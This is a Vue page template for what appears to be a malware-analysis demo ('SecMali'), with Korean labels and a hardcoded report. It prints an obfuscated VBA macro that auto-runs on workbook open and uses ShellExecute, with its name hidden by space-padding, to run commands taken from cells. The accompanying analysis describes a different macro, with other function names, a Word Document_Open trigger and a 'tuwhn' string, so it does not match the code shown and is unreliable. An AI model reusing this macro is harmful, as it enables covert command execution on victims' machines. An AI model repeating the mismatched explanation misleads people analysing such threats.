<template>
   <q-page id="sub">
    <div id='wrap'>
      <div class="hero-banner">
        <div class="text-center preview-description fixed-top-center">
         <h1>SecMali</h1>
        </div>
       </div>
       <div class="flex flex-center">
    <q-splitter
      v-model="splitterModel"
      style="height: 500px; width: 90%;"
    >

      <template v-slot:before>
        <q-splitter
          v-model="insideModel"
          horizontal
        >

          <template v-slot:before>
            <q-scroll-area style="height: 100%;">
            <div class="q-pa-md">
              <div class="text-h4 q-mb-md" style="font-weight: bold;">발견된 위협</div>
              <div class="q-my-md">파일명 : example.hwp<br>1. 매크로 발견<br>2. 의심스러운 실행 파일 발견</div>
            </div>
          </q-scroll-area>
          </template>

          <template v-slot:after>
            <q-scroll-area style="height: 100%;">
            <div class="q-pa-md">
              <div class="text-h4 q-mb-md" style="font-weight: bold;">매크로 코드</div>
              <div class="q-my-md">Private Sub Workbook_Open()<br>Dim g5 As String<br>Dim g6 As String<br><br>g5 = ""<br>g6 = ""<br><br>g5 = Cells(2, 7)  // $g$2<br>g6 = Cells(3, 7)  // $g$3<br><br>lyDdMyWVp = wJmdrV(g5, g6)<br><br>End Sub<br><br>Function wJmdrV(eeeew As String, ifgkdfg As String)<br><br>Dim DGjG() As Variant<br>   ReDim DGjG(4)<br>   DGjG(0) = "p" + ifgkdfg<br>   DGjG(1) = "ping google.com;" + eeeew<br>   DGjG(2) = ""<br>   DGjG(3) = ""<br>   DGjG(4) = 0<br>Dim sSVno As Object<br><br>Set sSVno = CreateObject(invuKAT())<br><br>zsEd = CallByName(sSVno, RijxuydD(" S h e l l E x e c u t e "), VbMethod, DGjG(0), DGjG(1), DGjG(2), DGjG(3), DGjG(4))



                <br><br>End Function


                <br><br>Function invuKAT()
                <br>invuKAT = RijxuydD("S h e l l . A p p l i c a t i o n")
                <br>End Function

                <br><br>Function RijxuydD(wjkwer)
                <br>newStr = ""
                <br>For i = 1 To Len(wjkwer)
                <br>   char = Mid(wjkwer, i, 1)
                <br>   If (char &lt;&gt; " ") Then
                <br>   newStr = newStr + Mid(wjkwer, i, 1)
                <br>   End If
                <br>Next
                <br>RijxuydD = newStr
                <br>End Function</div>
            </div>
            </q-scroll-area>
          </template>

        </q-splitter>
      </template>

      <template v-slot:after>
        <q-scroll-area style="height: 100%;">
        <div class="q-pa-md">
          <div class="text-h4 q-mb-md" style="font-weight: bold;">매크로 분석 결과</div>
          <div class="q-my-md">이 코드는 Microsoft Word 문서를 열 때 특정 동작을 수행하는 VBA (Visual Basic for Applications) 코드입니다.<br><br>

Document_Open()은 문서가 열릴 때 실행되는 매크로입니다. 이 함수 내에서는 세 가지 함수인 asfwefsadfasfsadf(), asfwqfasfsdafas(), eifhhdfasfiedf()를 호출합니다.<br><br>

asfwefsadfasfsadf() 함수는 현재 선택된 문자를 삭제합니다.<br><br>

asfwqfasfsdafas() 함수는 전체 문서를 선택하고, 선택된 텍스트의 글꼴을 숨깁니다.<br><br>

eifhhdfasfiedf() 함수는 가장 복잡한 부분으로, Shell.Application 객체를 생성하고, 특정 스크립트를 실행합니다. 이 스크립트는 웹에서 파일을 다운로드하고 실행하는 것으로 보입니다. 그러나 “tuwhn” 문자열을 제거하면 실제 URL과 스크립트 내용을 확인할 수 있습니다.<br><br>

이 코드는 사용자의 동의 없이 파일을 다운로드하고 실행하므로, 보안상 위험할 수 있습니다. 항상 신뢰할 수 있는 소스에서 코드를 가져오고, 코드가 무엇을 하는지 이해하기 전에는 실행하지 않는 것이 좋습니다.</div>
        </div>
        </q-scroll-area>
      </template>

    </q-splitter>
  </div> 
    </div>
   </q-page>
</template>

<script>
import { ref } from 'vue'

export default {
  setup () {
    return {
      splitterModel: ref(50), // start at 50%
      insideModel: ref(50)
    }
  }
}
</script>
<style scoped>
.sub {
  max-height: 100%;
}

.hero-banner {
  width: 98%;
    color: #131313;
    text-align: center;
    padding: 20px 0;
    font-weight: bold;
    margin-bottom: 20px;
}
.preview-description h1 {
    margin: 10px;
    -webkit-text-fill-color: #383F6D;
    -webkit-text-stroke: 3px #383F6D;
    font-size: 55px;
    font-family: 'Oxygen', sans-serif;
    text-transform: uppercase;
    letter-spacing: -4px;
}

body #wrap h1 {
  text-align: center;
  position: relative;
  width: 100%;
  line-height: 1.2;
  padding: 10px 0;
  color: #383F6D;
  font-weight: bold;
}


</style>
